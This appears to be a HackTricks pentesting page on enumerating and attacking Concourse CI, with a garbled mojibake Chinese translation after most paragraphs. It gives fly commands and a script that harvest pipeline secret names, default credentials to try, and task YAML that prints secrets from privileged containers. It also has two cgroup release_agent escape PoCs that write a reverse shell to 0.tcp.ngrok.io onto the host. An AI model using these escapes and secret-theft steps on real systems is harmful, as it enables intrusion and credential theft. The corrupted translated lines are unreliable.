# Concourse Enumeration & Attacks

ï¼ƒåˆ—ä¸¾å’Œæ”»å‡»

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>æ”¯æŒhacktrickså¹¶è·å¾—å¥½å¤„ï¼</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿ æ‚¨æ˜¯å¦æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨hacktricks **ä¸­åˆŠç™»å¹¿å‘Šï¼Ÿ è¿˜æ˜¯æ‚¨æƒ³è®¿é—®**æœ€æ–°ç‰ˆæœ¬çš„è±Œè±†æˆ–åœ¨pdf **ä¸­ä¸‹è½½hacktricksï¼Ÿ æ£€æŸ¥[**è®¢é˜…è®¡åˆ’**]ï¼ˆhttps://github.com/sponsors/carlospolopï¼‰ï¼

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - å‘ç°[**è±Œè±†å®¶åº­**]ï¼ˆhttps://opensea.io/collection/the-peass-familyï¼‰ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[** nfts **]ï¼ˆhttps://opensea.io/collectionï¼‰ /å®¶åº­å®¶åº­ï¼‰

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - è·å–[**å®˜æ–¹è±Œè±†å’Œhacktricksèµƒç‰©**]ï¼ˆhttps://peass.creator-spring.comï¼‰

- **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>

## User Roles & Permissions

Concourse comes with five roles:

å¤§å…æœ‰äº”ä¸ªè§’è‰²ï¼š

* _Concourse_ **Admin**: This role is only given to owners of the **main team** (default initial concourse team). Admins can **configure other teams** (e.g.: `fly set-team`, `fly destroy-team`...). The permissions of this role cannot be affected by RBAC.

*_concourse_ ** admin **ï¼šæ­¤è§’è‰²ä»…æˆäºˆ**ä¸»è¦å›¢é˜Ÿçš„æ‰€æœ‰è€…**ï¼ˆé»˜è®¤åˆå§‹ä¼šè®®å›¢é˜Ÿï¼‰ã€‚ ç®¡ç†å‘˜å¯ä»¥**é…ç½®å…¶ä»–å›¢é˜Ÿ**ï¼ˆä¾‹å¦‚ï¼š`fly set-team'ï¼Œ``é£è¢«æ‘§æ¯å›¢é˜Ÿ''...ï¼‰ã€‚ è¯¥è§’è‰²çš„æƒé™ä¸å—RBACçš„å½±å“ã€‚
* **owner**: Team owners can **modify everything within the team**.

***æ‰€æœ‰è€…**ï¼šå›¢é˜Ÿæ‰€æœ‰è€…å¯ä»¥**ä¿®æ”¹å›¢é˜Ÿä¸­çš„æ‰€æœ‰å†…å®¹**ã€‚
* **member**: Team members can **read and write** within the **teams assets** but cannot modify the team settings.

***æˆå‘˜**ï¼šå›¢é˜Ÿæˆå‘˜å¯ä»¥**åœ¨**å›¢é˜Ÿèµ„äº§ä¸­è¯»å†™** **ï¼Œä½†æ— æ³•ä¿®æ”¹å›¢é˜Ÿè®¾ç½®ã€‚
* **pipeline-operator**: Pipeline operators can perform **pipeline operations** such as triggering builds and pinning resources, however they cannot update pipeline configurations.

***ç®¡é“æ“ä½œå‘˜**ï¼šç®¡é“æ“ä½œå‘˜å¯ä»¥æ‰§è¡Œ**ç®¡é“æ“ä½œ**ï¼Œä¾‹å¦‚è§¦å‘æ„å»ºå’Œå›ºå®šèµ„æºï¼Œä½†æ˜¯ä»–ä»¬æ— æ³•æ›´æ–°ç®¡é“é…ç½®ã€‚
* **viewer**: Team viewers have **"read-only" access to a team** and its pipelines.

***è§‚ä¼—**ï¼šå›¢é˜Ÿè§‚ä¼—**â€œåªè¯»â€è®¿é—®å›¢é˜Ÿ**åŠå…¶ç®¡é“ã€‚

{% hint style="info" %}

{ï¼…æç¤ºæ ·å¼=â€œ infoâ€ï¼…}
Moreover, the **permissions of the roles owner, member, pipeline-operator and viewer can be modified** configuring RBAC (configuring more specifically it's actions). Read more about it in: [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)

æ­¤å¤–ï¼Œå¯ä»¥ä¿®æ”¹è§’è‰²æ‰€æœ‰è€…ï¼Œæˆå‘˜ï¼Œç®¡é“æ“ä½œå‘˜å’ŒæŸ¥çœ‹å™¨çš„**æƒé™**é…ç½®RBACï¼ˆæ›´å…·ä½“åœ°é…ç½®å…¶æ“ä½œï¼‰ã€‚ åœ¨ä»¥ä¸‹å†…å®¹ä¸­é˜…è¯»æœ‰å…³å®ƒçš„æ›´å¤šä¿¡æ¯ï¼š[https://concourse-ci.org/user-roles.html]ï¼ˆ
{% endhint %}

Note that Concourse **groups pipelines inside Teams**. Therefore users belonging to a Team will be able to manage those pipelines and **several Teams** might exist. A user can belong to several Teams and have different permissions inside each of them.

è¯·æ³¨æ„ï¼ŒConcourse **å›¢é˜Ÿå†…éƒ¨çš„ç®¡é“**ã€‚ å› æ­¤ï¼Œå±äºå›¢é˜Ÿçš„ç”¨æˆ·å°†èƒ½å¤Ÿç®¡ç†è¿™äº›ç®¡é“ï¼Œ**å¯èƒ½å­˜åœ¨å‡ ä¸ªå›¢é˜Ÿ**ã€‚ ç”¨æˆ·å¯ä»¥å±äºå‡ ä¸ªå›¢é˜Ÿï¼Œå¹¶ä¸”æ¯ä¸ªå›¢é˜Ÿéƒ½æœ‰ä¸åŒçš„æƒé™ã€‚

## Vars & Credential Manager

## varsï¼†å‡­æ®ç»ç†

In the YAML configs you can configure values using the syntax `((`_`source-name`_`:`_`secret-path`_`.`_`secret-field`_`))`.\

åœ¨YAMLé…ç½®ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¯­æ³•`ï¼ˆï¼ˆï¼ˆï¼ˆï¼ˆ_`source-name_'_'ï¼š`_` _`secret-path`_.
The **source-name is optional**, and if omitted, the [cluster-wide credential manager](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) will be used, or the value may be provided [statically](https://concourse-ci.org/vars.html#static-vars).\

** source-nameæ˜¯å¯é€‰çš„**ï¼Œå¦‚æœçœç•¥ï¼Œå°†ä½¿ç”¨[cluster wide corterential manager]ï¼ˆhttps://concourse-ci.org/vars.html#cluster-wide-credential-managerï¼‰ æˆ–å¯ä»¥æä¾›è¯¥å€¼[é™æ€]ï¼ˆhttps://concourse-ci.org/vars.html#static-varsï¼‰ã€‚
The **optional \_secret-field**\_ specifies a field on the fetched secret to read. If omitted, the credential manager may choose to read a 'default field' from the fetched credential if the field exists.\

**å¯é€‰\ _ secret-field ** \ _æŒ‡å®šè¯»å–çš„ç§˜å¯†ä¸Šçš„å­—æ®µã€‚ å¦‚æœçœç•¥ï¼Œå‡­æ®ç®¡ç†å™¨å¯ä»¥é€‰æ‹©ä»æ‰€è¿°å‡­æ®ä¸­è¯»å–â€œé»˜è®¤å­—æ®µâ€ï¼Œå¦‚æœè¯¥å­—æ®µå­˜åœ¨ã€‚\ \ \ \
Moreover, the _**secret-path**_ and _**secret-field**_ may be surrounded by double quotes `"..."` if they **contain special characters** like `.` and `:`. For instance, `((source:"my.secret"."field:1"))` will set the _secret-path_ to `my.secret` and the _secret-field_ to `field:1`.

æ­¤å¤–ï¼Œ_ ** secret-path ** _ and _ ** secret-field ** _å¯èƒ½è¢«åŒå¼•å·åŒ…å›´``...â€œ ï¼š`ã€‚ ä¾‹å¦‚ï¼Œ`ï¼ˆï¼ˆsourceï¼šâ€œ my.secretâ€ã€‚â€œ fieldï¼š1â€ï¼‰ï¼‰`å°†æŠŠ_secret-path_è®¾ç½®ä¸º`my.secret`å’Œ_secret-field_ to` fieldï¼šfieldï¼š1`ã€‚

### Static Vars

###é™æ€vars

Static vars can be specified in **tasks steps**:

å¯ä»¥åœ¨**ä»»åŠ¡æ­¥éª¤**ä¸­æŒ‡å®šé™æ€varsï¼š

```yaml
  - task: unit-1.13
    file: booklit/ci/unit.yml
    vars: {tag: 1.13}
```

Or using the following `fly` **arguments**:

æˆ–ä½¿ç”¨ä»¥ä¸‹â€œ flyâ€ **å‚æ•°**ï¼š

* `-v` or `--var` `NAME=VALUE` sets the string `VALUE` as the value for the var `NAME`.

*`-v`æˆ–`-var`åç§°=å€¼'å°†å­—ç¬¦ä¸²`å€¼è®¾ç½®ä¸ºvar`åç§°çš„å€¼ã€‚
* `-y` or `--yaml-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the var `NAME`.

*``-y`æˆ–`-yaml-var`åç§°= value` parses'value`ä¸ºyamlï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºvar`name'çš„å€¼ã€‚
* `-i` or `--instance-var` `NAME=VALUE` parses `VALUE` as YAML and sets it as the value for the instance var `NAME`. See [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) to learn more about instance vars.

*``-i`æˆ–``` -  instance-var`åç§°= value` parses'value`ä¸ºyaml''ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºå®ä¾‹var`name'çš„å€¼ã€‚ è¯·å‚é˜…[åˆ†ç»„ç®¡é“]ï¼ˆhttps://concourse-ci.org/instanced-pipelines.htmlï¼‰ï¼Œä»¥äº†è§£æœ‰å…³å®ä¾‹varsçš„æ›´å¤šä¿¡æ¯ã€‚
* `-l` or `--load-vars-from` `FILE` loads `FILE`, a YAML document containing mapping var names to values, and sets them all.

*``-l`æˆ–`-lolad-load-vars-from`æ–‡ä»¶åŠ è½½`files'ï¼Œä¸€ä¸ªåŒ…å«æ˜ å°„varåç§°çš„yamlæ–‡æ¡£ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸ºå…¨éƒ¨ã€‚

### Credential Management

There are different ways a **Credential Manager can be specified** in a pipeline, read how in [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\

å¯ä»¥åœ¨ç®¡é“ä¸­æŒ‡å®š**å‡­è¯ç®¡ç†å™¨çš„æ–¹å¼ä¸åŒï¼Œè¯·é˜…è¯»å¦‚ä½•åœ¨[https://concourse-ci.org/creds.html]ä¸­ä½¿ç”¨ ï¼‰ã€‚\
Moreover, Concourse supports different credential managers:

æ­¤å¤–ï¼ŒConcourseæ”¯æŒä¸åŒçš„å‡­è¯ç»ç†ï¼š

* [The Vault credential manager](https://concourse-ci.org/vault-credential-manager.html)

* [Vaultå‡­æ®ç®¡ç†å™¨]ï¼ˆhttps://concourse-ci.org/vault-credential-manager.htmlï¼‰
* [The CredHub credential manager](https://concourse-ci.org/credhub-credential-manager.html)

* [credhubå‡­æ®ç»ç†]ï¼ˆhttps://concourse-ci.org/credhub-credential-manager.htmlï¼‰
* [The AWS SSM credential manager](https://concourse-ci.org/aws-ssm-credential-manager.html)

* [AWS SSMå‡­æ®ç®¡ç†å™¨]ï¼ˆhttps://concourse-ci.org/aws-ssm-credential-manager.htmlï¼‰
* [The AWS Secrets Manager credential manager](https://concourse-ci.org/aws-asm-credential-manager.html)

* [AWS Secrets Managerå‡­è¯ç»ç†]ï¼ˆhttps://concourse-ci.org/aws-asm-credential-manager.htmlï¼‰
* [Kubernetes Credential Manager](https://concourse-ci.org/kubernetes-credential-manager.html)
* [The Conjur credential manager](https://concourse-ci.org/conjur-credential-manager.html)

* [conjurå‡­è¯ç»ç†]ï¼ˆhttps://concourse-ci.org/conjur-credential-manager.htmlï¼‰
* [Caching credentials](https://concourse-ci.org/creds-caching.html)

* [CACHINGå‡­æ®]ï¼ˆhttps://concourse-ci.org/creds-caching.htmlï¼‰
* [Redacting credentials](https://concourse-ci.org/creds-redacting.html)

* [åˆ é™¤å‡­æ®]ï¼ˆhttps://concourse-ci.org/creds-redacting.htmlï¼‰
* [Retrying failed fetches](https://concourse-ci.org/creds-retry-logic.html)

* [é‡è¯•å¤±è´¥çš„æå–]ï¼ˆhttps://concourse-ci.org/creds-retry-logic.htmlï¼‰

{% hint style="danger" %}
Note that if you have some kind of **write access to Concourse** you can create jobs to **exfiltrate those secrets** as Concourse needs to be able to access them.

è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨æœ‰æŸç§**å†™å…¥ä¼šè®®è®¿é—®æƒé™**ï¼Œåˆ™å¯ä»¥åˆ›å»ºä½œä¸šæ¥**å‰¥å¤ºè¿™äº›ç§˜å¯†**ï¼Œå› ä¸ºå¤§å…éœ€è¦èƒ½å¤Ÿè®¿é—®å®ƒä»¬ã€‚
{% endhint %}

## Concourse Enumeration

##ä¼šè®®æšä¸¾

In order to enumerate a concourse environment you first need to **gather valid credentials** or to find an **authenticated token** probably in a `.flyrc` config file.

ä¸ºäº†åˆ—ä¸¾ä¸€ä¸ªä¼šè®®ç¯å¢ƒï¼Œæ‚¨é¦–å…ˆéœ€è¦**æ”¶é›†æœ‰æ•ˆçš„å‡­æ®**æˆ–åœ¨â€œ .flyrcâ€é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ°**èº«ä»½éªŒè¯çš„ä»¤ç‰Œ**ã€‚

### Login and Current User enum

###ç™»å½•å’Œå½“å‰ç”¨æˆ·æšä¸¾

* To login you need to know the **endpoint**, the **team name** (default is `main`) and a **team the user belongs to**:

*è¦ç™»å½•ï¼Œæ‚¨éœ€è¦çŸ¥é“**ç«¯ç‚¹**ï¼Œ**å›¢é˜Ÿåç§°**ï¼ˆé»˜è®¤ä¸º`main'ï¼‰å’Œä¸€ä¸ªç”¨æˆ·å±äº**çš„**å›¢é˜Ÿï¼š
  * `fly --target example login --team-name my-team --concourse-url https://ci.example.com [--insecure] [--client-cert=./path --client-key=./path]`

*`fly-targetç¤ºä¾‹ç™»å½•-name my-team -concourse-url httpsï¼š//ci.example.com [ -  insecure] [ -  client-cert =ã€‚/path-client-key =ã€‚/è·¯å¾„]
* Get configured **targets**:

*è·å¾—é…ç½®**ç›®æ ‡**ï¼š
  * `fly targets`
* Get if the configured **target connection** is still **valid**:

*å¦‚æœå·²é…ç½®çš„**ç›®æ ‡è¿æ¥**ä»ç„¶**æœ‰æ•ˆ**ï¼šè·å–**ï¼š
  * `fly -t <target> status`
* Get **role** of the user against the indicated target:

*è·å¾—**çš„è§’è‰²**é’ˆå¯¹æ‰€æŒ‡ç¤ºçš„ç›®æ ‡ï¼š
  * `fly -t <target> userinfo`

  * `fly -t <target> userinfo`

### Teams & Users

###å›¢é˜Ÿå’Œç”¨æˆ·

* Get a list of the Teams

*è·å–å›¢é˜Ÿæ¸…å•
  * `fly -t <target> teams`

*`fly -t <Target>å›¢é˜Ÿ
* Get roles inside team

*åœ¨å›¢é˜Ÿä¸­æ‰®æ¼”è§’è‰²
  * `fly -t <target> get-team -n <team-name>`

*`fly -t <Target> Get -Team -N <Team -Name>``
* Get a list of users

*è·å–ç”¨æˆ·åˆ—è¡¨
  * `fly -t <target> active-users`

*`fly -t <Target> Active -Users

### Pipelines

* **List** pipelines:
  * `fly -t <target> pipelines -a`

*`fly -t <Target>ç®¡é“-A`
* **Get** pipeline yaml (**sensitive information** might be found in the definition):

***è·å–**ç®¡é“yamlï¼ˆ**æ•æ„Ÿä¿¡æ¯**å¯èƒ½åœ¨å®šä¹‰ä¸­æ‰¾åˆ°ï¼‰ï¼š
  * `fly -t <target> get-pipeline -p <pipeline-name>`
* Get all pipeline **config declared vars**
  * `for pipename in $(fly -t <target> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $pipename; fly -t <target> get-pipeline -p $pipename -j | grep -Eo '"vars":[^}]+'; done`
* Get all the **pipelines secret names used** (if you can create/modify a job or hijack a container you could exfiltrate them):

*è·å–æ‰€æœ‰ä½¿ç”¨çš„**ç®¡é“ç§˜å¯†åç§°**ï¼ˆå¦‚æœæ‚¨å¯ä»¥åˆ›å»º/ä¿®æ”¹ä½œä¸šæˆ–åŠ«æŒä¸€ä¸ªå®¹å™¨ï¼Œåˆ™å¯ä»¥åˆ é™¤å®ƒä»¬ï¼‰ï¼š

```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do 
    echo $pipename;
    fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
    echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```

### Containers & Workers

###å®¹å™¨å’Œå·¥äºº

* List **workers**:
  * `fly -t <target> workers`

*`fly -t <Target>å·¥äºº
* List **containers**:
  * `fly -t <target> containers`

*`fly -t <Target>å®¹å™¨
* List **builds** (to see what is running):

*åˆ—è¡¨**æ„å»º**ï¼ˆæŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„å†…å®¹ï¼‰ï¼š
  * `fly -t <target> builds`

*`fly -t <Target>æ„å»º

## Concourse Attacks

##ä¼šè®®æ”»å‡»

### Credentials Brute-Force

###å‡­è¯è›®åŠ›

* admin:admin
* test:test

### Secrets and params enumeration

###ç§˜å¯†å’Œå‚æ•°æšä¸¾

In the previous section we saw how you can **get all the secrets names and vars** used by the pipeline. The **vars might contain sensitive info** and the name of the **secrets will be useful later to try to steal** them.

åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†å¦‚ä½•**è·å–ç®¡é“ä½¿ç”¨çš„æ‰€æœ‰ç§˜å¯†åç§°å’Œvars **ã€‚ ** varså¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯**ï¼Œå¹¶ä¸”**ç§˜å¯†çš„åç§°ä»¥åå°†å¾ˆæœ‰ç”¨ï¼Œä»¥çªƒå–**ã€‚

### Session inside running or recently run container

###ä¼šè¯å†…éƒ¨è¿è¡Œæˆ–æœ€è¿‘è¿è¡Œçš„å®¹å™¨

If you have enough privileges (**member role or more**) you will be able to **list pipelines and roles** and just get a **session inside** the `<pipeline>/<job>` **container** using:

å¦‚æœæ‚¨æœ‰è¶³å¤Ÿçš„ç‰¹æƒï¼ˆ**æˆå‘˜è§’è‰²æˆ–æ›´å¤š**ï¼‰ï¼Œæ‚¨å°†èƒ½å¤Ÿ**åˆ—å‡ºç®¡é“å’Œè§’è‰²**ï¼Œç„¶ååœ¨**å†…éƒ¨è·å¾—**ä¼šè¯ã€‚ å®¹å™¨**ä½¿ç”¨ï¼š

```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```

With these permissions you might be able to:

æœ‰äº†è¿™äº›æƒé™ï¼Œæ‚¨å¯èƒ½å¯ä»¥ï¼š

* **Steal the secrets** inside the **container**

***å·ç§˜å¯†** **å®¹å™¨å†…**
* Try to **escape** to the node

*å°è¯•**é€ƒè„±**åˆ°èŠ‚ç‚¹
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node, if possible)

*æšä¸¾/æ»¥ç”¨**äº‘å…ƒæ•°æ®**ç«¯ç‚¹ï¼ˆå¦‚æœå¯èƒ½çš„è¯ï¼Œæ¥è‡ªåŠèˆ±å’ŒèŠ‚ç‚¹ï¼‰

### Pipeline Creation/Modification

If you have enough privileges (**member role or more**) you will be able to **create/modify new pipelines.** Check this example:

å¦‚æœæ‚¨æœ‰è¶³å¤Ÿçš„ç‰¹æƒï¼ˆ**æˆå‘˜è§’è‰²æˆ–æ›´å¤š**ï¼‰ï¼Œåˆ™å¯ä»¥**åˆ›å»º/ä¿®æ”¹æ–°ç®¡é“ã€‚**æ£€æŸ¥æ­¤ç¤ºä¾‹ï¼š

```yaml
jobs:
- name: simple
  plan:
  - task: simple-task
    privileged: true
    config:
      # Tells Concourse which type of worker this task should run on
      platform: linux
      image_resource:
        type: registry-image
        source:
          repository: busybox # images are pulled from docker hub by default
      run:
        path: sh
        args:
        - -cx
        - |
          echo "$SUPER_SECRET"
          sleep 1000
      params:
        SUPER_SECRET: ((super.secret))
```

With the **modification/creation** of a new pipeline you will be able to:

ä½¿ç”¨æ–°ç®¡é“çš„**ä¿®æ”¹/åˆ›å»º**ï¼Œæ‚¨å°†èƒ½å¤Ÿï¼š

* **Steal** the **secrets** (via echoing them out or getting inside the container and running `env`)

***çªƒå–** **ç§˜å¯†**ï¼ˆé€šè¿‡å›å£°æˆ–è¿›å…¥å®¹å™¨ä¸­å¹¶è¿è¡Œ`emb'ï¼‰
* **Escape** to the **node** (by giving you enough privileges - `privileged: true`)

***é€ƒè„±**åˆ°**èŠ‚ç‚¹**ï¼ˆé€šè¿‡èµ‹äºˆæ‚¨è¶³å¤Ÿçš„ç‰¹æƒ - `ç‰¹æƒï¼štrue`ï¼‰
* Enumerate/Abuse **cloud metadata** endpoint (from the pod and from the node)

*æšä¸¾/æ»¥ç”¨**äº‘å…ƒæ•°æ®**ç«¯ç‚¹ï¼ˆæ¥è‡ªåŠèˆ±å’ŒèŠ‚ç‚¹ï¼‰
* **Delete** created pipeline

### Execute Custom Task

This is similar to the previous method but instead of modifying/creating a whole new pipeline you can **just execute a custom task** (which will probably be much more **stealthier**):

è¿™ç±»ä¼¼äºä»¥å‰çš„æ–¹æ³•ï¼Œä½†æ˜¯æ‚¨å¯ä»¥**å¯ä»¥**æ‰§è¡Œè‡ªå®šä¹‰ä»»åŠ¡**ï¼ˆè¿™å¯èƒ½ä¼šæ›´** stealthier **ï¼‰ï¼š

```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
  type: registry-image
  source:
    repository: ubuntu
run:
  path: sh
  args:
  - -cx
  - |
    env
    sleep 1000
params:
  SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```

### Escaping to the node from privileged task

###ä»ç‰¹æƒä»»åŠ¡ä¸­é€ƒåˆ°èŠ‚ç‚¹

In the previous sections we saw how to **execute a privileged task with concourse**. This won't give the container exactly the same access as the privileged flag in a docker container. For example, you won't see the node filesystem device in /dev, so the escape could be more "complex".

åœ¨å‰é¢çš„éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†å¦‚ä½•**é€šè¿‡Concourseæ‰§è¡Œç‰¹æƒä»»åŠ¡**ã€‚ è¿™ä¸ä¼šä½¿å®¹å™¨ä¸Dockerå®¹å™¨ä¸­çš„ç‰¹æƒæ ‡å¿—å®Œå…¨ç›¸åŒã€‚ ä¾‹å¦‚ï¼Œæ‚¨ä¸ä¼šåœ¨ /devä¸­çœ‹åˆ°èŠ‚ç‚¹æ–‡ä»¶ç³»ç»Ÿè®¾å¤‡ï¼Œå› æ­¤é€ƒè„±å¯èƒ½æ›´â€œå¤æ‚â€ã€‚

In the following PoC we are going to use the release\_agent to escape with some small modifications:

åœ¨ä»¥ä¸‹POCä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ç‰ˆæœ¬\ _agentè¿›è¡Œä¸€äº›å°çš„ä¿®æ”¹ï¼š

```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

# The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

# Then next part I think is constant "hostpath-provisioner/default/"

# For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

# The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

{% hint style="warning" %}

{ï¼…æç¤ºæ ·å¼=â€œè­¦å‘Šâ€ï¼…}
As you might have noticed this is just a [**regular release\_agent escape**](../../linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/#privileged) just modifying the path of the cmd in the node

æ‚¨å¯èƒ½å·²ç»æ³¨æ„åˆ°ï¼Œè¿™åªæ˜¯[**å¸¸è§„ç‰ˆæœ¬\ _agent Escape **]ï¼ˆ../../ linux-hardening/privilege-eScalation/docker-breakout/docker-break-break-breakout-privilege-privilege-privilege-scalation/ï¼ƒprivilegengedï¼‰ åªæ˜¯ä¿®æ”¹èŠ‚ç‚¹ä¸­çš„CMDè·¯å¾„
{% endhint %}

### Escaping to the node from a Worker container

###ä»å·¥äººå®¹å™¨ä¸­é€ƒåˆ°èŠ‚ç‚¹

A regular release\_agent escape with a minor modification is enough for this:

å¸¸è§„ç‰ˆæœ¬\ _agent Escapeè¿›è¡Œæ¬¡è¦ä¿®æ”¹å°±è¶³å¤Ÿäº†ï¼š

```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```

### Escaping to the node from the Web container

###ä»Webå®¹å™¨é€ƒåˆ°èŠ‚ç‚¹

Even if the web container has some defenses disabled it's **not running as a common privileged container** (for example, you **cannot** **mount** and the **capabilities** are very **limited**, so all the easy ways to escape from the container are useless).

å³ä½¿Webå®¹å™¨æœ‰æŸäº›é˜²å¾¡æªæ–½ç¦ç”¨äº†ä¸€äº›é˜²å¾¡ï¼Œå®ƒä¹Ÿæ²¡æœ‰ä½œä¸ºæ™®é€šç‰¹æƒå®¹å™¨**è¿è¡Œï¼ˆä¾‹å¦‚ï¼Œæ‚¨**æ— æ³•** ** **å®‰è£…**å’Œ**åŠŸèƒ½**éå¸¸**æœ‰é™** ** ï¼Œå› æ­¤ä»å®¹å™¨ä¸­é€ƒè„±çš„æ‰€æœ‰ç®€å•æ–¹æ³•éƒ½æ˜¯æ²¡æœ‰ç”¨çš„ï¼‰ã€‚

However, it stores **local credentials in clear text**:

ä½†æ˜¯ï¼Œå®ƒåœ¨æ¸…æ™°çš„æ–‡æœ¬ä¸­å­˜å‚¨**æœ¬åœ°å‡­æ®**ï¼š

```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```

You cloud use that credentials to **login against the web server** and **create a privileged container and escape to the node**.

